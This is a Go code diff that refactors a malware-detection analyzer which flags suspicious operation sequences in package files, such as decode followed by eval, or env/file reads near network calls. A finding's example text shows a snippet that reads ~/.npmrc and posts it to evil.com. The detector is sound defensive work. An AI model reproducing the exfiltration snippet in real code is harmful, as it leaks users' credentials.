@@ -225,10 +225,10 @@ func (a *BehaviorSequenceAnalyzer) scanContent(content, filename string) []Findi
 
 		if allPresent {
 			findings = append(findings, Finding{
-				Analyzer:    a.Name(),
-				Title:       pattern.Name,
-				Description: fmt.Sprintf("%s in file %q. Matched indicators: %s", pattern.Description, filename, strings.Join(matchedIndicators, ", ")),
-				Severity:    pattern.Severity,
+				Analyzer:       a.Name(),
+				Title:          pattern.Name,
+				Description:    fmt.Sprintf("%s in file %q. Matched indicators: %s", pattern.Description, filename, strings.Join(matchedIndicators, ", ")),
+				Severity:       pattern.Severity,
 				ExploitExample: pattern.Exploit,
 				Remediation: "This file contains a combination of API calls commonly used in malicious packages. " +
 					"Review the code flow carefully to determine if this behavior is legitimate for the package's stated purpose.",
@@ -242,80 +242,89 @@ func (a *BehaviorSequenceAnalyzer) scanContent(content, filename string) []Findi
 	return findings
 }
 
+type behaviorOp struct {
+	lineNo int
+	opType string
+}
+
 // detectRapidSequence finds suspicious operations in close proximity.
 func (a *BehaviorSequenceAnalyzer) detectRapidSequence(content, filename string) []Finding {
-	var findings []Finding
+	ops := a.collectOperations(content)
+	return a.findSuspiciousSequences(ops, filename)
+}
 
+var sequenceOpPatterns = []struct {
+	opType   string
+	keywords []string
+}{
+	{"env-access", []string{"process.env", "env["}},
+	{"file-read", []string{"readfilesync", "fs.read"}},
+	{"network", []string{"fetch(", "axios", "http.request", "request("}},
+	{"eval", []string{"eval("}},
+	{"decode", []string{"base64", "atob", "buffer.from"}},
+}
+
+func (a *BehaviorSequenceAnalyzer) collectOperations(content string) []behaviorOp {
+	var ops []behaviorOp
 	lines := strings.Split(content, "\n")
-
-	// Track suspicious operations and their line numbers
-	type operation struct {
-		lineNo int
-		opType string
-	}
-	var ops []operation
 
 	for i, line := range lines {
 		lineNo := i + 1
 		lineLower := strings.ToLower(line)
 
-		if strings.Contains(lineLower, "process.env") || strings.Contains(lineLower, "env[") {
-			ops = append(ops, operation{lineNo, "env-access"})
-		}
-		if strings.Contains(lineLower, "readfilesync") || strings.Contains(lineLower, "fs.read") {
-			ops = append(ops, operation{lineNo, "file-read"})
-		}
-		if strings.Contains(lineLower, "fetch(") || strings.Contains(lineLower, "axios") ||
-			strings.Contains(lineLower, "http.request") || strings.Contains(lineLower, "request(") {
-			ops = append(ops, operation{lineNo, "network"})
-		}
-		if strings.Contains(lineLower, "eval(") || strings.Contains(lineLower, "function(") && strings.Contains(lineLower, "return") {
-			ops = append(ops, operation{lineNo, "eval"})
-		}
-		if strings.Contains(lineLower, "base64") || strings.Contains(lineLower, "atob") ||
-			strings.Contains(lineLower, "buffer.from") {
-			ops = append(ops, operation{lineNo, "decode"})
+		for _, pat := range sequenceOpPatterns {
+			for _, kw := range pat.keywords {
+				if strings.Contains(lineLower, kw) {
+					ops = append(ops, behaviorOp{lineNo, pat.opType})
+					break
+				}
+			}
 		}
 	}
+	return ops
+}
 
-	// Look for suspicious sequences within 10 lines of each other
+func (a *BehaviorSequenceAnalyzer) findSuspiciousSequences(ops []behaviorOp, filename string) []Finding {
+	var findings []Finding
 	for i := 0; i < len(ops)-1; i++ {
 		for j := i + 1; j < len(ops); j++ {
 			if ops[j].lineNo-ops[i].lineNo > 10 {
-				break // Too far apart
+				break
 			}
-
-			// Dangerous combinations
-			if (ops[i].opType == "env-access" || ops[i].opType == "file-read") &&
-				ops[j].opType == "network" {
-				findings = append(findings, Finding{
-					Analyzer:    a.Name(),
-					Title:       "Suspicious data access near network call",
-					Description: fmt.Sprintf("File %q: %s on line %d followed by %s on line %d - potential exfiltration", filename, ops[i].opType, ops[i].lineNo, ops[j].opType, ops[j].lineNo),
-					Severity:    SeverityHigh,
-					ExploitExample: "Close proximity of data access and network calls is suspicious:\n" +
-						"    - Line 5: const data = fs.readFileSync('~/.npmrc')\n" +
-						"    - Line 7: fetch('https://evil.com', {body: data})\n" +
-						"    Review this sequence to ensure data isn't being exfiltrated.",
-					Remediation: "Examine the data flow between these operations to determine if sensitive data is being transmitted.",
-				})
-			}
-
-			if ops[i].opType == "decode" && ops[j].opType == "eval" {
-				findings = append(findings, Finding{
-					Analyzer:    a.Name(),
-					Title:       "Decode followed by eval",
-					Description: fmt.Sprintf("File %q: decoding operation on line %d followed by eval on line %d", filename, ops[i].lineNo, ops[j].lineNo),
-					Severity:    SeverityCritical,
-					ExploitExample: "This is the classic obfuscated payload pattern:\n" +
-						"    - Step 1: Decode base64/hex string\n" +
-						"    - Step 2: Execute with eval()\n" +
-						"    The payload is hidden until runtime.",
-					Remediation: "Manually decode the payload to see what code is being executed.",
-				})
+			if f := a.checkOpPair(ops[i], ops[j], filename); f != nil {
+				findings = append(findings, *f)
 			}
 		}
 	}
-
 	return findings
+}
+
+func (a *BehaviorSequenceAnalyzer) checkOpPair(first, second behaviorOp, filename string) *Finding {
+	if (first.opType == "env-access" || first.opType == "file-read") && second.opType == "network" {
+		return &Finding{
+			Analyzer:    a.Name(),
+			Title:       "Suspicious data access near network call",
+			Description: fmt.Sprintf("File %q: %s on line %d followed by %s on line %d - potential exfiltration", filename, first.opType, first.lineNo, second.opType, second.lineNo),
+			Severity:    SeverityHigh,
+			ExploitExample: "Close proximity of data access and network calls is suspicious:\n" +
+				"    - Line 5: const data = fs.readFileSync('~/.npmrc')\n" +
+				"    - Line 7: fetch('https://evil.com', {body: data})\n" +
+				"    Review this sequence to ensure data isn't being exfiltrated.",
+			Remediation: "Examine the data flow between these operations to determine if sensitive data is being transmitted.",
+		}
+	}
+	if first.opType == "decode" && second.opType == "eval" {
+		return &Finding{
+			Analyzer:    a.Name(),
+			Title:       "Decode followed by eval",
+			Description: fmt.Sprintf("File %q: decoding operation on line %d followed by eval on line %d", filename, first.lineNo, second.lineNo),
+			Severity:    SeverityCritical,
+			ExploitExample: "This is the classic obfuscated payload pattern:\n" +
+				"    - Step 1: Decode base64/hex string\n" +
+				"    - Step 2: Execute with eval()\n" +
+				"    The payload is hidden until runtime.",
+			Remediation: "Manually decode the payload to see what code is being executed.",
+		}
+	}
+	return nil
 }
